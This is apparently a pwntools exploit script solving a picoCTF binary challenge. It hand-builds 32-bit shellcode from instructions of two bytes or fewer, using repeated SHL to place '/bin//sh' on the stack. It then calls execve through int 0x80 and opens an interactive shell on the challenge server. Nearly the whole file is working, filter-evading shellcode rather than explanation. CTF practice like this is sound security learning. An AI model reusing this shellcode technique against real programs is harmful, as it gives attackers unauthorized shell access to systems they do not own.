#!/usr/bin/env python3

from pwn import *

exe = ELF("./fun")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, '''
                break *execute+191
                continue
                ''')
    else:
        r = remote("mercury.picoctf.net", 16610)

    return r


def main():
    r = conn()
    
    # Since the restriction is for 2-byte (or less) instructions,
    # SHL instruction was opted for the creation of the string (shifts 1 bit at time; more requires 3+ bytes)

    # Create the string '/sh\x00' in EDX and push the content to the stack
    payload = asm('mov dh, 0x00')       # NULL-terminating byte
    payload += asm('mov dl, 0x68')      # 'h'
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('mov dh, 0x73')      # 's'
    payload += asm('mov dl, 0x2f')      # '/'
    payload += asm('push edx') + asm('nop')

    # Create the string '/bin' in EDX and push the content to the stack
    payload += asm('mov dh, 0x6e')      # 'n'
    payload += asm('mov dl, 0x69')      # 'i'
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('shl edx, 1')
    payload += asm('mov dh, 0x62')      # 'b'
    payload += asm('mov dl, 0x2f')      # '/'
    payload += asm('push edx') + asm('nop')

    # Put the address of '/bin//sh' in EBX via ESP (1st argument)
    payload += asm('mov ebx, esp')

    # Put 0 into ECX (2nd argument)
    payload += asm('xor ecx, ecx')

    # Put 0 into EDX (3rd argument)
    payload += asm('xor edx, edx')

    # Zeroes the EAX register (this is just for cleaning)
    payload += asm('xor eax, eax')

    # Put 11 into EAX, since "execve()"" is syscall '11'
    payload += asm('mov al, 11')

    # Makes the syscall by calling the kernel
    payload += asm('int 0x80')

    r.sendlineafter(b'Give me code to run:\n', payload)
    r.interactive() 


if __name__ == "__main__":
    main()
